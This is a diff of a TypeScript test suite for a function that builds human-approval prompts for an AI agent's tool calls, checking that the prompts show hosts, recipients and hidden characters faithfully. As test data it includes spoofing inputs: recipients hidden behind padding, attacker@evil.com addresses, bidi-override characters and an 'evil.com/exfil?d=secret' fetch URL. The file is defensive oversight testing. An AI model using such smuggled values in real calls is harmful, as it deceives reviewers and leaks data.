@@ -26,15 +26,22 @@ beforeAll(() => {
  * gateway REJECTS a request that exceeds them. So the caps are not style
  * advice here: exceeding one turns a confirmation into a failed tool call.
  */
+/** The prompt for a call that gets one; fails the test for one that is refused. */
+function promptFor(...args: Parameters<typeof buildApprovalPrompt>) {
+  const built = buildApprovalPrompt(...args);
+  if ("exceeded" in built) throw new Error(`refused: ${JSON.stringify(built.exceeded)}`);
+  return built;
+}
+
 describe("buildApprovalPrompt", () => {
   it("names the action rather than the function", () => {
-    const { title } = buildApprovalPrompt("pinchy_web_search", { query: "acme gmbh" });
+    const { title } = promptFor("pinchy_web_search", { query: "acme gmbh" });
     expect(title).toBe("Search the web");
     expect(title).not.toContain("pinchy_web_search");
   });
 
   it("puts the target in the description, so the reviewer sees what it acts on", () => {
-    const { description } = buildApprovalPrompt("pinchy_web_search", {
+    const { description } = promptFor("pinchy_web_search", {
       query: "acme gmbh",
     });
     expect(description).toContain("acme gmbh");
@@ -45,7 +52,7 @@ describe("buildApprovalPrompt", () => {
     // is in no registry — the same gap that made the confirmation list render
     // empty in #865. A prompt builder that returned nothing here would put an
     // unlabelled card in front of the user.
-    const { title, description } = buildApprovalPrompt("knowledge_search", {
+    const { title, description } = promptFor("knowledge_search", {
       query: "vacation policy",
     });
     expect(title.length).toBeGreaterThan(0);
@@ -54,7 +61,7 @@ describe("buildApprovalPrompt", () => {
   });
 
   it("keeps both fields inside the gateway's hard caps", () => {
-    const { title, description } = buildApprovalPrompt("pinchy_write", {
+    const { title, description } = promptFor("pinchy_write", {
       path: "a/very/long/path/".repeat(40),
       content: "x".repeat(5000),
     });
@@ -63,7 +70,7 @@ describe("buildApprovalPrompt", () => {
   });
 
   it("truncates visibly rather than cutting a word mid-air", () => {
-    const { description } = buildApprovalPrompt("pinchy_write", {
+    const { description } = promptFor("pinchy_write", {
       content: "y".repeat(5000),
     });
     expect(description.endsWith("…")).toBe(true);
@@ -74,7 +81,7 @@ describe("buildApprovalPrompt", () => {
     // chat channels. summarizeArgs already redacts these for the card; the
     // same redaction has to hold here or the safer surface leaks what the
     // riskier one hides.
-    const { description } = buildApprovalPrompt("pinchy_web_fetch", {
+    const { description } = promptFor("pinchy_web_fetch", {
       url: "https://example.com",
       api_key: "sk-live-must-not-appear",
     });
@@ -82,7 +89,7 @@ describe("buildApprovalPrompt", () => {
   });
 
   it("has no argument text at all when the call carries none", () => {
-    const { description } = buildApprovalPrompt("pinchy_web_search", {});
+    const { description } = promptFor("pinchy_web_search", {});
     expect(description.length).toBeGreaterThan(0);
     expect(description).not.toContain("undefined");
     expect(description).not.toContain("{}");
@@ -93,22 +100,19 @@ describe("buildApprovalPrompt", () => {
   // an invoice and a note are different answers. The resources the gate
   // resolved are what the card has to show.
   it("names the resource the call acts on", () => {
-    const { title } = buildApprovalPrompt("odoo_delete", { ids: [7] }, ["account.move"]);
+    const { title } = promptFor("odoo_delete", { ids: [7] }, ["account.move"]);
     expect(title).toContain("account.move");
   });
 
   it("names every resource of a call that spans more than one", () => {
-    const { title } = buildApprovalPrompt("odoo_reconcile", {}, [
-      "account.move",
-      "account.payment",
-    ]);
+    const { title } = promptFor("odoo_reconcile", {}, ["account.move", "account.payment"]);
     expect(title).toContain("account.move");
     expect(title).toContain("account.payment");
   });
 
   it("says nothing about resources when the call names none", () => {
-    const bare = buildApprovalPrompt("email_send", { to: "ada@example.com" });
-    const empty = buildApprovalPrompt("email_send", { to: "ada@example.com" }, []);
+    const bare = promptFor("email_send", { to: "ada@example.com" });
+    const empty = promptFor("email_send", { to: "ada@example.com" }, []);
     expect(empty.title).toBe(bare.title);
     expect(empty.title).not.toContain("—");
   });
@@ -117,12 +121,12 @@ describe("buildApprovalPrompt", () => {
   // word "null" on a security prompt; the honest rendering is to leave the
   // resource unstated and let the tool name carry the meaning.
   it("does not print an unnamed resource", () => {
-    const { title } = buildApprovalPrompt("odoo_confirm_order", {}, [null]);
+    const { title } = promptFor("odoo_confirm_order", {}, [null]);
     expect(title.toLowerCase()).not.toContain("null");
   });
 
   it("keeps the title inside the cap even with many resources", () => {
-    const { title } = buildApprovalPrompt(
+    const { title } = promptFor(
       "odoo_write",
       {},
       Array.from({ length: 20 }, (_, i) => `a.very.long.model.name.number.${i}`)
@@ -146,12 +150,9 @@ describe("buildApprovalPrompt", () => {
       id: 9,
       label: "S00009",
     });
-    const { description } = buildApprovalPrompt(
-      "odoo_confirm_order",
-      { target: ref },
-      ["sale.order"],
-      { refRecord: makeRefResolver(REF_KEY) }
-    );
+    const { description } = promptFor("odoo_confirm_order", { target: ref }, ["sale.order"], {
+      refRecord: makeRefResolver(REF_KEY),
+    });
     expect(description).not.toContain(ref.slice(20, 40));
     // Outside any quotes: quoted, the record read exactly like a string typed
     // with those characters.
@@ -168,7 +169,7 @@ describe("buildApprovalPrompt", () => {
       id: 7,
       label: "Raimund Korber",
     });
-    const { description } = buildApprovalPrompt(
+    const { description } = promptFor(
       "email_send",
       { to: "kunde@example.com", body: `${ref}=\n\nBitte überweisen Sie an AT00 1234` },
       [],
@@ -179,7 +180,7 @@ describe("buildApprovalPrompt", () => {
   });
 
   it("shows free text that starts with the ref prefix as the text it is", () => {
-    const { description } = buildApprovalPrompt("email_send", {
+    const { description } = promptFor("email_send", {
       to: "boss@firma.at",
       subject: "pinchy_ref:v1: Neue Bankverbindung",
     });
@@ -189,7 +190,7 @@ describe("buildApprovalPrompt", () => {
   // Odoo reads bool("false") as True — on a security prompt the string and the
   // boolean must not print alike.
   it("tells a string that reads like a literal apart from the literal", () => {
-    const { description } = buildApprovalPrompt("odoo_write", {
+    const { description } = promptFor("odoo_write", {
       values: { active: "false", is_company: false, x: null },
     });
     expect(description).toContain('active: "false"');
@@ -198,7 +199,7 @@ describe("buildApprovalPrompt", () => {
   });
 
   it("names the recipient's address before a padded display name", () => {
-    const { description } = buildApprovalPrompt("email_send", {
+    const { description } = promptFor("email_send", {
       to: `Raimund Korber${"\u2800".repeat(190)} <attacker@evil.com>`,
       subject: "Rechnung",
     });
@@ -208,7 +209,7 @@ describe("buildApprovalPrompt", () => {
   // card. Once the summary keeps real arrays/objects, flattening them with
   // String() would print "[object Object]" on a security prompt.
   it("spells out nested arguments instead of printing [object Object]", () => {
-    const { description } = buildApprovalPrompt("odoo_write", {
+    const { description } = promptFor("odoo_write", {
       ids: [7],
       values: { acc_number: "AT61 1904", amount: 99999 },
     });
@@ -218,7 +219,7 @@ describe("buildApprovalPrompt", () => {
   });
 
   it("lists every recipient, including one smuggled behind padding", () => {
-    const { description } = buildApprovalPrompt("email_send", {
+    const { description } = promptFor("email_send", {
       to: `chef@firma.at${" ".repeat(300)}, angreifer@evil.com`,
     });
     expect(description).toContain("chef@firma.at");
@@ -230,14 +231,14 @@ describe("buildApprovalPrompt", () => {
     ["/data/x⟨U+00A0⟩y.md", "/data/x y.md"],
     ["/data/a⟨4 spaces⟩b.md", "/data/a    b.md"],
   ])("prints a typed marker %j apart from the character it names", (typed, real) => {
-    const prompt = (path: string) => buildApprovalPrompt("pinchy_write", { path }).description;
+    const prompt = (path: string) => promptFor("pinchy_write", { path }).description;
     expect(prompt(typed)).not.toBe(prompt(real));
   });
 
   // The title names the model the call acts on, and that name comes from the
   // call too — it is rendered like every other value.
   it("renders the model in the title as the card does", () => {
-    const { title } = buildApprovalPrompt("odoo_delete", {}, ["res.partner‮evil", "a⟨b"]);
+    const { title } = promptFor("odoo_delete", {}, ["res.partner‮evil", "a⟨b"]);
     expect(title).toContain("res.partner⟨U+202E⟩evil");
     expect(title).toContain("a⟨U+27E8⟩b");
   });
@@ -245,7 +246,7 @@ describe("buildApprovalPrompt", () => {
   // A CRLF mail body printed "⟨U+000D⟩" before every line break on the chat
   // prompt, as on the card.
   it("renders a CRLF body as line breaks", () => {
-    const { description } = buildApprovalPrompt("email_send", {
+    const { description } = promptFor("email_send", {
       to: "a@x.at",
       body: "Hallo,\r\nzweite Zeile\rx",
     });
@@ -254,7 +255,7 @@ describe("buildApprovalPrompt", () => {
 
   it("never cuts the description between the halves of an emoji", () => {
     for (let pad = 0; pad < 4; pad++) {
-      const { description } = buildApprovalPrompt("email_send", {
+      const { description } = promptFor("email_send", {
         to: "a@x.at",
         body: `${"x".repeat(pad)}${"😀".repeat(300)}`,
       });
@@ -270,7 +271,7 @@ describe("buildApprovalPrompt", () => {
   // U+202D … U+202C U+2069), each right-to-left word in an isolate of its own
   // (U+2066 … U+2069).
   it("holds the arguments in the order they were sent", () => {
-    const shown = (path: string) => buildApprovalPrompt("pinchy_write", { path }).description;
+    const shown = (path: string) => promptFor("pinchy_write", { path }).description;
     expect(shown("/data/חוזים/2024.md")).toContain(
       '\u2066\u202Dpath: "/data/\u2066חוזים\u2069/2024.md"\u202C\u2069'
     );
@@ -281,7 +282,7 @@ describe("buildApprovalPrompt", () => {
 
   // A line break ends an override, so every line of a body opens its own.
   it("holds every line of a multi-line value in order", () => {
-    const { description } = buildApprovalPrompt("email_send", { body: "שלום 1\n2 עולם" });
+    const { description } = promptFor("email_send", { body: "שלום 1\n2 עולם" });
     expect(description).toContain(
       '\u2066\u202Dbody: "\u2066שלום\u2069 1\u202C\u2069\n\u2066\u202D2 \u2066עולם\u2069"\u202C\u2069'
     );
@@ -291,7 +292,7 @@ describe("buildApprovalPrompt", () => {
   // exactly like the dagesh on the word's last letter. The prompt is built from
   // the same escaping as the card.
   it("marks a combining mark that has no letter to sit on", () => {
-    const shown = (path: string) => buildApprovalPrompt("pinchy_write", { path }).description;
+    const shown = (path: string) => promptFor("pinchy_write", { path }).description;
     expect(shown("/data/\u05BCבא.md")).toContain("/data/⟨U+05BC⟩\u2066בא\u2069.md");
     expect(shown("/data/בא\u05BC.md")).toContain("/data/\u2066בא\u05BC\u2069.md");
   });
@@ -317,12 +318,12 @@ describe("buildApprovalPrompt", () => {
       { path: "/data/a.md, content: hi" },
     ],
   ])("prints %s apart from the real thing", (_label, real, forged) => {
-    const prompt = (args: unknown) => buildApprovalPrompt("odoo_write", args).description;
+    const prompt = (args: unknown) => promptFor("odoo_write", args).description;
     expect(prompt(forged)).not.toBe(prompt(real));
   });
 
   it("quotes every string, at every level", () => {
-    const { description } = buildApprovalPrompt("odoo_write", {
+    const { description } = promptFor("odoo_write", {
       ids: ["7, 8"],
       values: { name: 'Acme "Ltd", \\x', active: false },
     });
@@ -362,7 +363,7 @@ describe("buildApprovalPrompt", () => {
     let compared = 0;
     for (let n = 0; n < 20000; n++) {
       const args = object(0);
-      const { description } = buildApprovalPrompt("odoo_write", args);
+      const { description } = promptFor("odoo_write", args);
       if (description.endsWith("…")) continue;
       compared++;
       const call = JSON.stringify(args);
@@ -380,7 +381,7 @@ describe("buildApprovalPrompt", () => {
   // `https://www.firma.at.` and before the domain it really reaches.
   describe("when the description has to be cut", () => {
     it("names every host the call reaches before the arguments", () => {
-      const { description } = buildApprovalPrompt("odoo_write", {
+      const { description } = promptFor("odoo_write", {
         ids: [7],
         values: { comment: "x ".repeat(200), website: "https://evil.com/", email: "a@b.evil.org" },
       });
@@ -392,23 +393,53 @@ describe("buildApprovalPrompt", () => {
 
     it("names a long host by its end, where the domain it reaches is", () => {
       const host = `www.firma.at.${"a".repeat(300)}.evil.com`;
-      const { description } = buildApprovalPrompt("pinchy_web_fetch", { url: `https://${host}/x` });
+      const { description } = promptFor("pinchy_web_fetch", { url: `https://${host}/x` });
       expect(description.length).toBeLessThanOrEqual(APPROVAL_DESCRIPTION_MAX);
       expect(description).toContain(`reaches "…${host.slice(-PROMPT_HOST_MAX)}" — url:`);
     });
 
-    it("names each host once, and says so when more do not fit", () => {
-      const hosts = Array.from({ length: 6 }, (_, i) => `${String(i).repeat(60)}.example`);
-      const { description } = buildApprovalPrompt("email_send", {
+    it("names each host once", () => {
+      const hosts = Array.from({ length: 2 }, (_, i) => `${String(i).repeat(80)}.example`);
+      const { description } = promptFor("email_send", {
         to: [hosts[0], ...hosts].map((host) => `x@${host}`),
       });
       expect(description.length).toBeLessThanOrEqual(APPROVAL_DESCRIPTION_MAX);
       expect(description.split(`"${hosts[0]}"`)).toHaveLength(2);
-      expect(description).toMatch(/^Send email directly — reaches "0+\.example", ".*", … — to:/);
+      expect(description).toMatch(
+        /^Send email directly — reaches "0+\.example", "1+\.example" — to:/
+      );
+    });
+
+    // Naming the hosts that fit and eliding the rest left out whichever came
+    // last — and the order is the call's: decoys under `target` and
+    // `destination` ahead of `url` took the room, and the host the fetch
+    // reached went unnamed. A prompt that cannot name every host is not
+    // offered at all.
+    it("refuses a call whose hosts do not all fit, rather than leave one out", () => {
+      const hosts = Array.from({ length: 6 }, (_, i) => `${String(i).repeat(60)}.example`);
+      expect(buildApprovalPrompt("email_send", { to: hosts.map((host) => `x@${host}`) })).toEqual({
+        exceeded: { kind: "too-many-hosts", count: 6 },
+      });
+    });
+
+    it("names every host whatever order the arguments come in", () => {
+      const params = {
+        target: `https://${"a".repeat(80)}.firma.at/`,
+        destination: "https://b.firma.at/",
+        url: "https://evil.com/exfil?d=secret",
+        note: "x ".repeat(100),
+      };
+      for (const order of [params, Object.fromEntries(Object.entries(params).reverse())]) {
+        const { description } = promptFor("pinchy_web_fetch", order);
+        expect(description.length).toBeLessThanOrEqual(APPROVAL_DESCRIPTION_MAX);
+        for (const host of [`${"a".repeat(80)}.firma.at`, "b.firma.at", "evil.com"]) {
+          expect(description).toContain(`"${host}"`);
+        }
+      }
     });
 
     it("leaves a hidden secret's host unsaid", () => {
-      const { description } = buildApprovalPrompt("odoo_write", {
+      const { description } = promptFor("odoo_write", {
         values: { comment: "x ".repeat(200), api_key: "https://secret.example/" },
       });
       expect(description).not.toContain("secret.example");
@@ -416,14 +447,14 @@ describe("buildApprovalPrompt", () => {
   });
 
   it("adds no hosts to a description that fits", () => {
-    const { description } = buildApprovalPrompt("pinchy_web_fetch", { url: "https://evil.com/x" });
+    const { description } = promptFor("pinchy_web_fetch", { url: "https://evil.com/x" });
     expect(description).toBe(
       'Download and read content from web pages — url: "https://evil.com/x"'
     );
   });
 
   it("adds no control characters to a call without right-to-left text", () => {
-    const { description } = buildApprovalPrompt("pinchy_write", { path: "/data/2024/x.md" });
+    const { description } = promptFor("pinchy_write", { path: "/data/2024/x.md" });
     expect(description).not.toMatch(/[\u2066-\u2069\u202A-\u202E]/);
   });
 });
